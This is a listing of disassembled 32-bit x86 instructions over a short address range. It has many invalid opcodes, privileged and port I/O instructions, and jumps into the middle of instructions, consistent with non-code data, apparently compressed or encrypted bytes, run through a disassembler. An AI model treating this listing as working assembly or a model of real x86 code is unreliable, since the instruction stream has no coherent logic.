  48e0cb:	imul   ebp,DWORD PTR [ecx+ecx*1-0x40a1a1a8],0x5d75865c
  48e0d6:	mov    esi,0x5f9ca430
  48e0db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48e0dc:	push   esp
  48e0dd:	push   DWORD PTR [esi+0x20]
  48e0e0:	aad    0xc0
  48e0e2:	xor    BYTE PTR [edx+ebp*1],ch
  48e0e5:	fild   WORD PTR [edi+0x5c]
  48e0e8:	mov    al,0x61
  48e0ea:	test   al,0x79
  48e0ec:	cs inc esi
  48e0ee:	ja     0x48e14e
  48e0f0:	cmp    DWORD PTR [ebx+eax*1+0xf1fe358],0xe4215758
  48e0fb:	ins    BYTE PTR es:[edi],dx
  48e0fc:	aas    
  48e0fd:	cli    
  48e0fe:	popa   
  48e0ff:	mov    eax,ds:0x61a1a36e
  48e104:	inc    esp
  48e105:	ja     0x48e10b
  48e107:	cli    
  48e108:	pop    esi
  48e109:	mov    cl,BYTE PTR [ebx*8-0x3ce1a347]
  48e110:	pop    ds
  48e111:	sbb    ebx,DWORD PTR ds:0x45ed32a5
  48e117:	and    cl,BYTE PTR [eax]
  48e119:	cmp    al,0x2b
  48e11b:	iret   
  48e11c:	retf   0xfc00
  48e11f:	je     0x48e119
  48e121:	adc    BYTE PTR [ebp+0xc],dh
  48e124:	repz repz push ebx
  48e127:	test   eax,0xeaa20408
  48e12c:	je     0x48e1a4
  48e12e:	or     DWORD PTR [edx+0x52],0x5867bae9
  48e135:	jg     0x48e123
  48e137:	sbb    eax,0xe7e809e9
  48e13c:	sbb    DWORD PTR [eax-0x1c195ab6],edi
  48e142:	loop   0x48e0cf
  48e144:	adc    eax,0x8be11f0
  48e149:	jecxz  0x48e1b5
  48e14b:	mov    BYTE PTR ds:0xd782b8eb,0x21
  48e152:	inc    eax
  48e153:	mov    eax,0x18e969f8
  48e158:	add    eax,0x1fec00d2
  48e15d:	mov    ch,0xb4
  48e15f:	add    esp,esp
  48e161:	xor    ch,BYTE PTR [edi+0x1]
  48e164:	push   cs
  48e165:	ins    DWORD PTR es:[edi],dx
  48e166:	dec    ebx
  48e167:	js     0x48e185
  48e169:	ret    0xb3c9
  48e16c:	add    DWORD PTR ds:0x505ad688,esp
  48e172:	repnz int3 
  48e174:	rol    BYTE PTR [ebx+eax*1-0x7b74110c],cl
  48e17b:	(bad)  
  48e17c:	fucomi st,st(0)
  48e17e:	jb     0x48e17f
  48e180:	jg     0x48e19a
  48e182:	mov    eax,DWORD PTR [esi-0x6f91c6e4]
  48e188:	lds    eax,FWORD PTR [edx-0x66]
  48e18b:	pop    edx
  48e18c:	add    edi,DWORD PTR [ebp-0x71]
  48e18f:	je     0x48e1d8
  48e191:	inc    esp
  48e192:	call   0xd0ff05cb
  48e197:	adc    DWORD PTR [ecx],edx
  48e199:	cmp    al,BYTE PTR [ecx+ebx*4+0x47]
  48e19d:	or     al,0x9b
  48e19f:	cmp    DWORD PTR [ecx+0x23f8a1c],edx
  48e1a5:	popa   
  48e1a6:	lods   al,BYTE PTR ds:[esi]
  48e1a7:	pop    ebx
  48e1a8:	fst    st(3)
  48e1aa:	inc    esi
  48e1ab:	or     BYTE PTR [ebx],dh
  48e1ad:	xchg   ebp,edi
  48e1af:	push   edx
  48e1b0:	sbb    ah,BYTE PTR [ecx-0xdc077bf]
  48e1b6:	xor    BYTE PTR [edx+ecx*2],al
  48e1b9:	out    dx,al
  48e1ba:	pop    ds
  48e1bb:	xchg   BYTE PTR [ecx+0x1586c7ac],cl
  48e1c1:	sub    DWORD PTR [ebp+0x74],0x7f
  48e1c5:	or     cl,BYTE PTR [ebp+0x5b12a086]
  48e1cb:	cli    
  48e1cc:	sub    al,0xdf
  48e1ce:	dec    edi
  48e1cf:	(bad)  
  48e1d0:	in     al,0x1c
  48e1d2:	fist   WORD PTR [ecx]
  48e1d4:	pop    esi
  48e1d5:	jae    0x48e1ec
  48e1d7:	add    DWORD PTR [edi-0x745578e2],ebx
  48e1dd:	ss call 0x4379abe5
  48e1e3:	xor    BYTE PTR [edx+ebp*1-0xf7a5dce],ch
  48e1ea:	ds sti 
  48e1ec:	dec    esp
  48e1ed:	aad    0xf2
  48e1ef:	xlat   BYTE PTR ds:[ebx]
  48e1f0:	xchg   edx,eax
  48e1f1:	fnstenv [ebx+ebx*8-0x9fc7a1]
  48e1f8:	pop    ds
  48e1f9:	push   ebp
  48e1fa:	pop    ebx
  48e1fb:	pop    edx
  48e1fc:	or     BYTE PTR [ecx],0xef
  48e1ff:	popa   
  48e200:	fild   WORD PTR [edi+ebp*4+0x603cc9a0]
  48e207:	fimul  WORD PTR [ebx+0x5ae8583d]
  48e20d:	or     ebx,DWORD PTR [edi+0x79050660]
  48e213:	add    al,0xd
  48e215:	data16 (bad) [ecx]
  48e218:	jno    0x48e24b
  48e21a:	mov    edx,0x66a45e52
  48e21f:	push   es
  48e220:	sbb    BYTE PTR [ebx-0xf],dl
  48e223:	addr16 sti 
  48e225:	imul   ecx,DWORD PTR [esi],0x5b6a1e1a
  48e22b:	inc    eax
  48e22c:	or     al,0x4
  48e22e:	call   edi
  48e230:	push   ebx
  48e231:	push   0xffffff95
  48e233:	jbe    0x48e294
  48e235:	pop    ss
  48e236:	sbb    al,0x29
  48e238:	push   cs
  48e239:	push   0x26141ea0
  48e23e:	mov    eax,ds:0x2eeb4a9a
  48e243:	daa    
  48e244:	cmp    edx,DWORD PTR [ecx]
  48e246:	push   cs
  48e247:	sub    BYTE PTR [edx],dl
  48e249:	and    al,0x1c
  48e24b:	xchg   ebp,eax
  48e24c:	jno    0x48e2b9
  48e24e:	pop    edi
  48e24f:	or     ah,BYTE PTR ds:0x81fc35b
  48e255:	les    eax,FWORD PTR [esi+ecx*4]
  48e258:	or     DWORD PTR [ebp+0x2ada1891],edx
  48e25e:	arpl   WORD PTR [edi],bp
  48e260:	push   ss
  48e261:	xor    BYTE PTR [ebp+0x15ad75a1],ah
  48e267:	push   esi
  48e268:	lds    esp,FWORD PTR [ebp+0x413a1061]
  48e26e:	(bad)  
  48e26f:	jns    0x48e2e4
  48e271:	sub    al,0x24
  48e273:	in     al,dx
  48e274:	inc    edi
  48e275:	xchg   edx,eax
  48e276:	cmp    esp,esp
  48e278:	sahf   
  48e279:	mov    eax,ecx
  48e27b:	xor    BYTE PTR [ebp+0x56],ch
  48e27e:	sbb    BYTE PTR [edx],ah
  48e280:	sbb    al,0xc5
  48e282:	jecxz  0x48e2a8
  48e284:	mov    ah,0x13
  48e286:	hlt    
  48e287:	mov    DWORD PTR [edi],0xb784bae5
  48e28d:	xchg   BYTE PTR [edi+0x47],al
  48e290:	dec    ebp
  48e291:	xchg   ebp,eax
  48e292:	xlat   BYTE PTR ds:[ebx]
  48e293:	add    al,0x4
  48e295:	mov    dh,0x7f
  48e297:	pop    ds
  48e298:	add    al,0xc7
  48e29a:	ficom  DWORD PTR [ebx]
  48e29c:	xor    dh,bl
  48e29e:	call   0x230cd2f3
  48e2a3:	mov    esi,0x87f57c9
  48e2a8:	xchg   esi,eax
  48e2a9:	scas   eax,DWORD PTR es:[edi]
  48e2aa:	pop    ecx
  48e2ab:	and    eax,0x3f6a4260
  48e2b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48e2b1:	pop    eax
  48e2b2:	mov    ch,0x70
  48e2b4:	nop
  48e2b5:	dec    BYTE PTR [edi]
  48e2b7:	scas   eax,DWORD PTR es:[edi]
  48e2b8:	(bad)  
  48e2b9:	dec    edi
  48e2ba:	js     0x48e2d8
  48e2bc:	cmp    bh,ah
  48e2be:	pop    ss
  48e2bf:	pushf  
  48e2c0:	dec    ebx
  48e2c1:	rol    BYTE PTR [ebx],0x3f
  48e2c4:	sub    esi,ebx
  48e2c6:	loop   0x48e2c7
  48e2c8:	push   ebp
  48e2c9:	adc    al,0x2c
  48e2cb:	cmp    BYTE PTR [ebx-0x6],al
  48e2ce:	dec    edi
  48e2cf:	jns    0x48e2c7
  48e2d1:	pop    esi
  48e2d2:	pop    ebx
  48e2d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48e2d4:	or     eax,0x1fd0cc2c
  48e2d9:	icebp  
  48e2da:	pop    eax
  48e2db:	xor    BYTE PTR [esi+edx*1-0x43],ah
  48e2df:	push   esi
  48e2e0:	adc    bh,bh
  48e2e2:	jbe    0x48e34c
  48e2e4:	adc    al,0x58
  48e2e6:	mov    ah,0xe6
  48e2e8:	sbb    DWORD PTR [ecx],edx
  48e2ea:	lods   eax,DWORD PTR ds:[esi]
  48e2eb:	xchg   esp,eax
  48e2ec:	jl     0x48e336
  48e2ee:	aas    
  48e2ef:	mov    BYTE PTR [eax+0x4d7033be],al
  48e2f5:	adc    al,0xf0
  48e2f7:	adc    dl,BYTE PTR [eax+0x3d3da5e]
  48e2fd:	pusha  
  48e2fe:	and    ebx,DWORD PTR [ebx]
  48e300:	into   
  48e301:	cld    
  48e302:	fbld   TBYTE PTR [ecx-0x5f]
  48e305:	sub    BYTE PTR [edx],dl
  48e307:	scas   eax,DWORD PTR es:[edi]
  48e308:	(bad)  
  48e309:	xor    edi,DWORD PTR [edi-0x5b]
  48e30c:	dec    edi
  48e30d:	inc    ebx
  48e30e:	retf   0x52a5
  48e311:	jmp    0x28ec0394
  48e316:	or     DWORD PTR [eax+esi*1],ebp
  48e319:	xor    al,0xaa
  48e31b:	out    dx,al
  48e31c:	xor    eax,0x3c0d3844
  48e321:	or     bh,BYTE PTR [eax+0x1ff7c347]
  48e327:	sbb    ch,al
  48e329:	inc    edx
  48e32a:	add    BYTE PTR [eax-0x32],ah
  48e32d:	dec    edx
  48e32e:	or     al,0x83
  48e330:	sar    BYTE PTR [edi+0xf9c0ca],1
  48e336:	dec    esp
  48e337:	ror    DWORD PTR [eax+0x6b],0xc0
  48e33b:	sbb    BYTE PTR [ebx-0x4919cf40],al
  48e341:	dec    esp
  48e342:	test   al,0xae
  48e344:	inc    edx
  48e345:	sbb    cl,BYTE PTR cs:[esi]
  48e348:	fnsave [edi]
  48e34a:	cwde   
  48e34b:	fwait
  48e34c:	adc    BYTE PTR [esp+esi*2],al
  48e34f:	or     edx,edi
  48e351:	mov    eax,DWORD PTR [edx]
  48e353:	push   eax
  48e354:	jmp    0x48e35e
  48e356:	or     DWORD PTR [ebx],eax
  48e358:	pop    eax
  48e359:	das    
  48e35a:	add    bl,BYTE PTR [edx-0x15dfb673]
  48e360:	sbb    bl,ch
  48e362:	xlat   BYTE PTR ds:[ebx]
  48e363:	jmp    0x48e3b3
  48e365:	jo     0x48e37a
  48e367:	push   ebx
  48e368:	clc    
  48e369:	mov    WORD PTR [edx-0x5ffc94b6],cs
  48e36f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48e370:	test   eax,0xcc4806a0
  48e375:	enter  0x241e,0x28
  48e379:	xchg   edx,eax
  48e37a:	outs   dx,BYTE PTR ds:[esi]
  48e37b:	pop    edx
  48e37c:	aas    
  48e37d:	push   cs
  48e37e:	and    BYTE PTR [edx],cl
  48e380:	je     0x48e393
  48e382:	cld    
  48e383:	jne    0x48e3e0
  48e385:	fistp  DWORD PTR [eax+ebp*4+0x5a1e12d6]
  48e38c:	fstp   DWORD PTR [edx+0x7a]
  48e38f:	xor    BYTE PTR [edi],dl
  48e391:	adc    BYTE PTR [edi+0x24dd9ed2],ch
  48e397:	aam    0x28
  48e399:	adc    ah,BYTE PTR [edi]
  48e39b:	sbb    ebx,ebx
  48e39d:	mov    bh,0xa3
  48e39f:	mov    ds:0x18412451,al
  48e3a4:	cmp    bl,ch
  48e3a6:	or     cl,BYTE PTR [ebx+0xb]
  48e3a9:	into   
  48e3aa:	dec    BYTE PTR [edx]
  48e3ac:	jbe    0x48e3e7
  48e3ae:	gs cld 
  48e3b0:	je     0x48e3bc
  48e3b2:	mov    eax,0x13ebe500
  48e3b7:	jno    0x48e434
  48e3b9:	dec    ecx
  48e3ba:	clc    
  48e3bb:	mov    bl,0xb
  48e3bd:	out    dx,eax
  48e3be:	jne    0x48e3c3
  48e3c0:	add    esp,DWORD PTR [edx+0x8]
  48e3c3:	popa   
  48e3c4:	or     BYTE PTR [esi],dh
  48e3c6:	aas    
  48e3c7:	pop    es
  48e3c8:	mov    ebx,0x10ca4304
  48e3cd:	mov    edx,0xedf8614e
  48e3d2:	push   esi
  48e3d3:	mov    DWORD PTR [esi+ebx*4+0x71f80ffc],edi
  48e3da:	sub    eax,DWORD PTR [ebx+0x71b030c2]
  48e3e0:	add    DWORD PTR [edx-0x6af136ce],0xc0a882db
  48e3ea:	add    bh,BYTE PTR [esi]
  48e3ec:	or     al,0x42
  48e3ee:	add    al,0xeb
  48e3f0:	add    bl,BYTE PTR [eax]
  48e3f2:	add    eax,0x8ca0576
  48e3f7:	and    BYTE PTR [edx+0x3c],cl
  48e3fa:	fistp  DWORD PTR ds:0x7856edc0
  48e400:	push   edx
  48e401:	mov    eax,0xc4d0ff7d
  48e406:	dec    ebp
  48e407:	loopne 0x48e3ea
  48e409:	mov    ah,BYTE PTR [eax+0xb100488]
  48e40f:	xor    al,al
  48e411:	ja     0x48e454
  48e413:	dec    edx
  48e414:	jmp    esp
  48e416:	pop    ebp
  48e417:	jmp    0xe0691fb
  48e41c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48e41d:	jg     0x48e450
  48e41f:	dec    ebp
  48e420:	adc    BYTE PTR [esi+0x3],al
  48e423:	hlt    
  48e424:	jmp    DWORD PTR [edx+0x3d18bc1]
  48e42a:	(bad)  
  48e42b:	cmp    edi,esi
  48e42d:	jbe    0x48e437
  48e42f:	rol    BYTE PTR [edx+0xf841f0a],cl
  48e435:	mov    al,BYTE PTR [ecx+0x1c72b2f9]
  48e43b:	ret    0xdb7e
  48e43e:	push   esp
  48e43f:	ss xchg edi,eax
  48e441:	je     0x48e456
  48e443:	pop    edx
  48e444:	and    edi,0xf
  48e447:	and    esi,0xf
  48e44a:	dec    eax
  48e44b:	out    dx,eax
  48e44c:	and    eax,esp
  48e44e:	mov    bh,0xc0
  48e450:	jne    0x48e457
  48e452:	mov    bl,BYTE PTR [ecx-0x13]
  48e455:	neg    DWORD PTR [edi+0x75]
  48e458:	adc    al,0xc1
  48e45a:	jmp    0x5cbdc67
  48e45f:	xor    ah,dl
  48e461:	add    esp,DWORD PTR [esi+0x8]
  48e464:	jb     0x48e48f
  48e466:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48e468:	ficom  WORD PTR [ebp+0x2]
  48e46b:	aaa    
  48e46c:	lods   al,BYTE PTR ds:[esi]
  48e46d:	ror    BYTE PTR [edi],1
  48e46f:	inc    ecx
  48e470:	push   es
  48e471:	mov    edx,0x4e98339
  48e476:	jb     0x48e445
  48e478:	fmul   QWORD PTR [edx]
  48e47a:	or     bl,BYTE PTR [edx+0x2ec8f8e0]
  48e480:	test   esp,esp
  48e482:	push   cs
  48e483:	cmp    al,0x8d
  48e485:	jnp    0x48e436
  48e487:	repnz sahf 
  48e489:	loopne 0x48e41b
  48e48b:	push   cs
  48e48c:	fs hlt 
  48e48e:	and    BYTE PTR es:[eax],dl
  48e491:	inc    esp
  48e492:	push   es
  48e493:	in     al,dx
  48e494:	ficomp DWORD PTR [edi-0xc]
  48e497:	and    edx,ecx
  48e499:	mov    bl,BYTE PTR [edi+eax*1]
  48e49c:	mov    al,BYTE PTR [esi+0x1]
  48e49f:	mov    BYTE PTR [edi+0x1],al
  48e4a2:	or     al,BYTE PTR [edx]
  48e4a4:	lods   al,BYTE PTR ds:[esi]
  48e4a5:	adc    ch,ch
  48e4a7:	and    DWORD PTR [edi-0x2d],ebx
  48e4aa:	mov    dl,0xc6
  48e4ac:	(bad)  
  48e4ad:	mov    ecx,0x57498dcc
  48e4b2:	push   edx
  48e4b3:	imul   ebx,DWORD PTR [edx+0x2014b2f],0xa695a602
  48e4bd:	pushf  
  48e4be:	sbb    eax,0xc6834790
  48e4c3:	xchg   BYTE PTR [ecx],al
  48e4c5:	mov    bh,ah
  48e4c7:	mov    ebp,0xcc72037
  48e4cc:	mov    ah,0x6
  48e4ce:	lods   al,BYTE PTR ds:[esi]
  48e4cf:	push   cs
  48e4d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48e4d1:	jmp    edi
  48e4d3:	jns    0x48e473
  48e4d5:	pushf  
  48e4d6:	xchg   esp,eax
  48e4d7:	mov    WORD PTR [ebx+ecx*4-0x761b71bc],es
  48e4de:	inc    esp
  48e4df:	(bad)  
  48e4e0:	in     al,0x3c
  48e4e2:	iret   
  48e4e3:	repz cmp al,0xe8
  48e4e6:	call   0xf439d1d7
  48e4eb:	cmp    al,0xcf
  48e4ed:	repz lock hlt 
  48e4f0:	hlt    
  48e4f1:	clc    
  48e4f2:	clc    
  48e4f3:	repnz sub BYTE PTR [esi-0x72990332],ah
  48e4fa:	or     ebp,DWORD PTR [edi+0x14ac30c1]
  48e500:	add    edi,eax
  48e502:	sbb    edi,edi
  48e504:	jmp    0xd3cebf1
  48e509:	outs   dx,BYTE PTR ds:[esi]
  48e50a:	clc    
  48e50b:	or     BYTE PTR ds:[eax],dl
  48e50e:	and    al,BYTE PTR [ebp+0x8]
  48e511:	mov    cs,ecx
  48e513:	ret    
  48e514:	nop
  48e515:	inc    ebx
  48e516:	sbb    BYTE PTR [ebx+ecx*1-0x2a],ch
  48e51a:	pop    ss
  48e51b:	sti    
  48e51c:	and    eax,DWORD PTR [esi-0xa]
  48e51f:	mov    al,0xc3
  48e521:	pusha  
  48e522:	and    ebx,DWORD PTR [edi+edx*2]
  48e525:	lea    esi,[ecx+esi*1-0x32]
  48e529:	add    eax,0x7ce2b927
  48e52e:	cmp    esp,edi
  48e530:	pop    es
  48e531:	and    al,0xd
  48e533:	std    
  48e534:	(bad)  
  48e535:	cld    
  48e536:	mov    eax,0xee7cadb3
  48e53b:	ins    BYTE PTR es:[edi],dx
  48e53c:	adc    edi,esi
  48e53e:	fst    DWORD PTR [ecx*4-0x6a6969e4]
  48e545:	xchg   ecx,eax
  48e546:	mov    eax,ds:0x702bf927
  48e54b:	adc    BYTE PTR [ebx+0x3b],al
  48e54e:	out    dx,eax
  48e54f:	in     eax,dx
  48e550:	pop    ecx
  48e551:	nop
  48e552:	adc    BYTE PTR [esi],0xa4
  48e555:	push   es
  48e556:	int3   
  48e557:	fiadd  DWORD PTR [ebx]
  48e559:	jl     0x48e4ed
  48e55b:	retf   0x336e
  48e55e:	fisub  WORD PTR [edx-0x104afe12]
  48e564:	add    DWORD PTR [edx-0x227bab22],esi
  48e56a:	sahf   
  48e56b:	inc    edi
  48e56c:	push   edi
  48e56d:	out    dx,al
  48e56e:	push   edx
  48e56f:	add    dh,BYTE PTR [ecx+0x6b]
  48e572:	xchg   edi,eax
  48e573:	push   esp
  48e574:	mov    BYTE PTR [eax+0x4e3a484f],dl
  48e57a:	rol    DWORD PTR [esi+0x67],cl
  48e57d:	pop    edx
  48e57e:	add    eax,DWORD PTR [ebx]
  48e580:	loop   0x48e5d8
  48e582:	mul    DWORD PTR [esi]
  48e584:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48e585:	adc    dh,BYTE PTR [eax+0x280c20b7]
  48e58b:	push   es
  48e58c:	lahf   
  48e58d:	out    0x79,eax
  48e58f:	sahf   
  48e590:	xor    BYTE PTR [eax],bh
  48e592:	inc    eax
  48e593:	dec    eax
  48e594:	push   eax
  48e595:	arpl   WORD PTR [ecx],dx
  48e597:	out    0x79,eax
  48e599:	sahf   
  48e59a:	pop    ss
  48e59b:	aaa    
  48e59c:	sbb    al,0x1c
  48e59e:	sbb    BYTE PTR [eax],bl
  48e5a0:	sahf   
  48e5a1:	out    0x79,eax
  48e5a3:	sahf   
  48e5a4:	adc    al,0x14
  48e5a6:	adc    BYTE PTR [eax],dl
  48e5a8:	or     al,0xc
  48e5aa:	inc    edx
  48e5ab:	sahf   
  48e5ac:	out    0x79,eax
  48e5ae:	or     BYTE PTR [eax],cl
  48e5b0:	add    al,0x4
  48e5b2:	clc    
  48e5b3:	mov    esp,0x7c474337
  48e5b8:	or     al,BYTE PTR [esi+eax*1-0x69ee576c]
  48e5bf:	xor    al,0x15
  48e5c1:	test   eax,0x3031637
  48e5c6:	and    dh,BYTE PTR [eax+0xf1ff144]
  48e5cc:	daa    
  48e5cd:	mov    ds:0x77834f7e,eax
  48e5d2:	fist   DWORD PTR [esi]
  48e5d4:	mov    cx,WORD PTR [eax]
  48e5d7:	adc    al,0xaa
  48e5d9:	outs   dx,DWORD PTR ds:[esi]
  48e5da:	pop    ds
  48e5db:	add    al,0x1e
  48e5dd:	cmc    
  48e5de:	sub    ebx,DWORD PTR [edx]
  48e5e0:	sar    eax,1
  48e5e2:	dec    eax
  48e5e3:	pop    ebp
  48e5e4:	ret    
  48e5e5:	adc    DWORD PTR [edx+0x273de24b],ebp
  48e5eb:	inc    esp
  48e5ec:	adc    eax,0x694e3570
  48e5f1:	minps  xmm5,XMMWORD PTR [eax+0x4c357249]
  48e5f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48e5f9:	sub    cl,BYTE PTR [esi]
  48e5fb:	dec    eax
  48e5fc:	(bad)
  48e5ff:	icebp  
  48e600:	mov    ebx,eax
  48e602:	push   0x42f3c2d6
  48e607:	cli    
  48e608:	adc    ecx,DWORD PTR ds:0xfe688144
  48e60e:	sub    edi,ebx
  48e610:	das    
  48e611:	loopne 0x48e5a5
  48e613:	nop
  48e614:	in     al,0xde
  48e616:	jne    0x48e5ea
  48e618:	push   ebp
  48e619:	add    al,ah
  48e61b:	fstp   DWORD PTR [ecx+esi*1+0x44]
  48e61f:	push   ds
  48e620:	pop    ecx
  48e621:	xor    BYTE PTR [eax-0x4],cl
  48e624:	das    
  48e625:	cmp    bl,dl
  48e627:	lock or BYTE PTR [eax],dl
  48e62a:	xor    al,bl
  48e62c:	add    eax,ebx
  48e62e:	cmp    eax,ebx
  48e630:	jb     0x48e641
  48e632:	push   eax
  48e633:	push   DWORD PTR [ebp+0x6]
  48e636:	adc    bh,dh
  48e638:	sub    eax,0x59915b24
  48e63d:	pop    ecx
  48e63e:	(bad)  
  48e63f:	sti    
  48e640:	inc    DWORD PTR [eax-0x22]
  48e643:	inc    ebx
  48e644:	adc    BYTE PTR [edx],ch
  48e646:	ds je  0x48e678
  48e649:	sar    edi,0x2
  48e64c:	push   eax
  48e64d:	lea    esi,[eax+edi*4]
  48e650:	call   DWORD PTR ds:0x4f117576
  48e656:	or     DWORD PTR [eax-0x7],edx
  48e659:	(bad)  
  48e65a:	cmp    eax,0xc2ac6eb4
  48e65f:	sbb    dh,BYTE PTR [edx]
  48e661:	mov    DWORD PTR [esi],eax
  48e663:	push   ss
  48e664:	push   esi
  48e665:	push   cs
  48e666:	mov    ds:0x1c168430,eax
  48e66b:	sbb    DWORD PTR [eax-0x15],edi
  48e66e:	add    ch,BYTE PTR [edi]
  48e670:	dec    esp
  48e671:	mov    bh,0x50
  48e673:	xor    BYTE PTR [edi-0x70df95f0],dh
  48e679:	inc    ebp
  48e67a:	test   DWORD PTR [edi+0x7f621066],esi
  48e680:	pop    ecx
  48e681:	or     BYTE PTR [ebp+0x5dade80],al
  48e687:	push   0x18
  48e689:	pop    eax
  48e68a:	xchg   BYTE PTR [esi],ah
  48e68c:	sub    edi,DWORD PTR [eax]
  48e68e:	loope  0x48e62b
  48e690:	mov    al,ds:0x680c6a0c
  48e695:	nop
  48e696:	into   
  48e697:	push   esi
  48e698:	fs ins BYTE PTR es:[edi],dx
  48e69a:	or     BYTE PTR [esi+0x6fdc07e],dh
  48e6a0:	xchg   esi,eax
  48e6a1:	and    DWORD PTR [ebp-0x4],0xffffffd3
  48e6a5:	into   
  48e6a6:	jecxz  0x48e701
  48e6a8:	arpl   WORD PTR [ecx+0x4d],sp
  48e6ab:	jne    0x48e6f6
  48e6ad:	cld    
  48e6ae:	or     BYTE PTR [eax+0x2c],ah
  48e6b1:	inc    ebx
  48e6b2:	mov    bh,0x7b
  48e6b4:	shl    ah,cl
  48e6b6:	push   ecx
  48e6b7:	mov    cl,0xc3
  48e6b9:	push   ebx
  48e6ba:	lahf   
  48e6bb:	pop    ebx
  48e6bc:	push   edi
  48e6bd:	jo     0x48e697
  48e6bf:	sar    dh,1
  48e6c1:	add    cl,dl
  48e6c3:	neg    eax
  48e6c5:	sbb    eax,eax
  48e6c7:	push   es
  48e6c8:	pop    ecx
  48e6c9:	mov    DWORD PTR [edi+0x1d030607],edi
  48e6cf:	inc    dh
  48e6d1:	pop    esi
  48e6d2:	les    esp,FWORD PTR [ebx-0x26]
  48e6d5:	lahf   
  48e6d6:	add    BYTE PTR [ebp+0x42],bh
  48e6d9:	push   0x65
  48e6db:	xchg   esi,eax
  48e6dc:	dec    eax
  48e6dd:	ins    BYTE PTR es:[edi],dx
  48e6de:	mov    DWORD PTR [esi],ecx
  48e6e0:	or     BYTE PTR [eax+0x2],ch
  48e6e3:	cmp    BYTE PTR [edi-0x5e],0x18
  48e6e7:	push   cs
  48e6e8:	cmp    ecx,DWORD PTR ds:0x82340a48
  48e6ee:	out    dx,eax
  48e6ef:	fwait
  48e6f0:	mov    eax,ds:0xe400d72
  48e6f5:	test   DWORD PTR [eax+0x70],ecx
  48e6f8:	jne    0x48e701
  48e6fa:	dec    esi
  48e6fb:	addr16 (bad) 
  48e6fd:	mov    eax,0x430bef11
  48e702:	xor    BYTE PTR ds:0x16380708,al
  48e708:	lea    eax,[ebp+0x3f549a5d]
  48e70e:	shl    DWORD PTR [eax+0x7e],cl
  48e711:	mov    WORD PTR [edx],gs
  48e713:	lock call 0x270:0x40f62abf
  48e71b:	jne    0x48e731
  48e71d:	add    DWORD PTR [edx],0xffffffc8
  48e720:	add    edx,ebx
  48e722:	or     BYTE PTR [ebx],ch
  48e724:	lea    ecx,[esi-0x1f]
  48e727:	mov    dl,0x48
  48e729:	inc    esi
  48e72a:	lea    eax,ds:0xd070123
  48e730:	xor    al,BYTE PTR [edx+0x10]
  48e733:	dec    edx
  48e734:	cmp    BYTE PTR [eax],bh
  48e736:	push   ecx
  48e737:	sub    al,BYTE PTR [eax+0x557f021d]
  48e73d:	add    dl,0xe0
  48e740:	es push ss
  48e742:	outs   dx,DWORD PTR ds:[esi]
  48e743:	jae    0x48e70c
  48e745:	add    BYTE PTR [edi+0x410fb62a],ch
  48e74b:	adc    al,0x21
  48e74d:	cmp    BYTE PTR [eax-0x7c07298c],bl
  48e753:	ror    BYTE PTR [edi+0x7060f537],cl
  48e759:	std    
  48e75a:	mov    eax,0xa40402ca
  48e75f:	inc    ebx
  48e760:	stos   DWORD PTR es:[edi],eax
  48e761:	les    ebx,FWORD PTR [eax-0x8]
  48e764:	push   ss
  48e765:	daa    
  48e766:	pop    ebx
  48e767:	add    BYTE PTR [eax+0x53],0x33
  48e76b:	adc    BYTE PTR [eax+0x19baa35d],ch
  48e771:	shl    BYTE PTR [edi-0x36],0x78
  48e775:	adc    al,0x8
  48e777:	cmp    al,0x2b
  48e779:	fistp  QWORD PTR [ecx]
  48e77b:	or     BYTE PTR [ebp+0x10],dh
  48e77e:	in     al,dx
  48e77f:	cmp    ebx,esi
  48e781:	icebp  
  48e782:	js     0x48e794
  48e784:	push   edx
  48e785:	loop   0x48e77b
  48e787:	retf   0xa6b
  48e78a:	inc    ebp
  48e78b:	add    edi,DWORD PTR [esi-0x10]
  48e78e:	inc    esi
  48e78f:	sbb    al,0xc
  48e791:	pop    es
  48e792:	sub    eax,0xa54b80d5
  48e797:	or     eax,DWORD PTR [esi]
  48e799:	sar    BYTE PTR [eax],0x66
  48e79c:	fs test al,0xfd
  48e79f:	sbb    eax,DWORD PTR [esi+0x3a]
  48e7a2:	cmp    si,ax
  48e7a5:	je     0x48e76f
  48e7a7:	jmp    0x48e7dc
  48e7a9:	and    al,BYTE PTR [ebx]
  48e7ab:	(bad)  
  48e7ad:	fucom  st(7)
  48e7af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48e7b0:	shl    BYTE PTR [esi],cl
  48e7b2:	push   ds
  48e7b3:	push   0x62
  48e7b5:	pop    ds
  48e7b6:	add    ebx,0x2
  48e7b9:	and    eax,0xb13bba55
  48e7be:	in     al,dx
  48e7bf:	bound  ebp,QWORD PTR [esi+0x69]
  48e7c2:	add    eax,0xc1a0e6cd
  48e7c7:	lods   eax,DWORD PTR ds:[esi]
  48e7c8:	sbb    al,cl
  48e7ca:	add    al,0xc6
  48e7cc:	sub    eax,ecx
  48e7ce:	das    
  48e7cf:	pop    esi
  48e7d0:	xor    BYTE PTR [ebp-0x7b],cl
  48e7d3:	sbb    eax,0x5f619a3e
  48e7d8:	sbb    eax,DWORD PTR ds:0x8842cc3d
  48e7de:	add    edx,DWORD PTR [edi]
  48e7e0:	pop    edx
  48e7e1:	imul   ecx,DWORD PTR cs:[eax],0xe0a107c4
  48e7e8:	cld    
  48e7e9:	pop    ss
  48e7ea:	lahf   
  48e7eb:	test   ebx,ebp
  48e7ed:	pop    ebx
  48e7ee:	push   cs
  48e7ef:	cs ss sbb al,0x72
  48e7f3:	mov    ah,dl
  48e7f5:	sub    esi,ecx
  48e7f7:	js     0x48e807
  48e7f9:	dec    eax
  48e7fa:	call   0x7301:0xd0d042e7
  48e801:	mov    ecx,0x2c1f052
  48e806:	push   cs
  48e807:	rcl    al,cl
  48e809:	je     0x48e7d3
  48e80b:	ret    0x10e1
  48e80e:	aam    0x40
  48e810:	jmp    0x48e862
  48e812:	inc    esi
  48e813:	shl    cl,cl
  48e815:	push   es
  48e816:	into   
  48e817:	xor    DWORD PTR [ebx],eax
  48e819:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
